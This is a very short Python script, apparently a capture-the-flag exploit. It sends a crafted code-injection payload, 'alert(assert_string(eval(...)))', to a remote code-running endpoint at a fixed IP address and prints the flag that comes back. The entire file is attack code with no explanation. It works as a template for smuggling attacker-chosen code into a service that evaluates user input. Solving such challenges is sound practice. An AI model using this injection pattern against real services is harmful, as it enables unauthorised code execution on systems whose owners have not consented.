import requests

host = "http://35.207.132.47/wee/run"
code = "eval('')"

check = {"code": "alert(assert_string("+code+"))"}
flag_request = requests.post(host, json=check)
flag = flag_request.json()["result"].strip()
print(flag)
